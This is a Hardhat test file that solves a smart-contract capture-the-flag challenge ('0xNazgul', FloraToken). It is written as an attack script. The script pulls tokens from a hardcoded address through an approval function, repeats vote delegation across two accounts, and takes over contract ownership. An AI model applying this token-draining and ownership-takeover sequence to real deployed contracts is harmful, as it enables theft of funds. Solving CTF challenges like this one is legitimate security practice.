import { Contract, Signer } from "ethers";
import { ethers, upgrades } from "hardhat";
import { expect } from "chai";
import { SETUP_0xNazgul, CHALLENGE_0xNazgul } from "../../scripts/addresses"

let accounts: Signer[];
let attacker: Signer;
let helper: Signer;
let deployer: Signer;
let attackerAddress: string;
let helperAddress: string;
let secretAddress: string
let exploit: Contract;
let setup: Contract;
let challenge: Contract;
let tx: any;

before(async () => {
    [attacker, helper] = await ethers.getSigners();
    attackerAddress = await attacker.getAddress();
    helperAddress = await helper.getAddress();
    setup = (await ethers.getContractAt(`contracts/0xNazgul/Setup.sol:Setup`, SETUP_0xNazgul)).connect(attacker);
    challenge = await ethers.getContractAt(`contracts/0xNazgul/FloraToken.sol:FloraToken`, CHALLENGE_0xNazgul);
    expect(await setup.isSolved()).to.eq(false);
});

it("prints contract address", async function () {
    // const addr = await setup.kingVault()
    // expect(addr).to.eq(CHALLENGE_agusduha);
});


it('Exploit', async function () {
    secretAddress = "0x9678408E1B126A985D61a0A6c99ae98AbF4c85B3";
    await setup.connect(attacker).approveFor(secretAddress, attackerAddress, 1000);
    await setup.connect(helper).approveFor(secretAddress, helperAddress, 1000);
    await challenge.connect(attacker).transferFrom(secretAddress, attackerAddress, 10);
    await challenge.connect(attacker).delegate(attackerAddress);
    await challenge.connect(helper).transferFrom(secretAddress, helperAddress, 10);
    await challenge.connect(helper).delegate(attackerAddress);
    await challenge.connect(attacker).transferFrom(secretAddress, attackerAddress, 80);
    await challenge.connect(attacker).delegate(attackerAddress);
    console.log((await challenge.balanceOf(attackerAddress)).toString());
    console.log((await challenge.numCheckpoints(attackerAddress)).toString());
    console.log((await challenge.numCheckpoints(await challenge.owner())).toString());
    console.log("hello");
    await challenge.connect(attacker).transferOwnership(attackerAddress);
    // exploit = await (await ethers.getContractFactory(`contracts/0xNazgul/Exploit.sol:Exploit`, attacker)).deploy(challenge.address);
    expect(await setup.isSolved()).to.eq(true);
});